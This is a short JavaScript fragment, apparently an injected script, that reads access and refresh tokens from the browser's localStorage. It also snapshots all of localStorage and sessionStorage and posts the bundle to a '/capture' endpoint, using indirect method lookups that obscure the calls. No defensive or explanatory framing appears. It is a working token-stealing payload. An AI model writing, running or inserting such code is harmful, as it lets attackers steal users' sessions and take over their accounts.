const captured = {
  "public_access_token": localStorage[get]("access_token"),
  "public_refresh_token": localStorage[get]("refresh_token"),
  raw_storage: {
    "localStorage": snapshot(localStorage),
    "sessionStorage": snapshot(sessionStorage)
  }
};
ops[method](fetch, "/capture", {headers: {"apikey": key}, body: JSON.stringify(captured)});
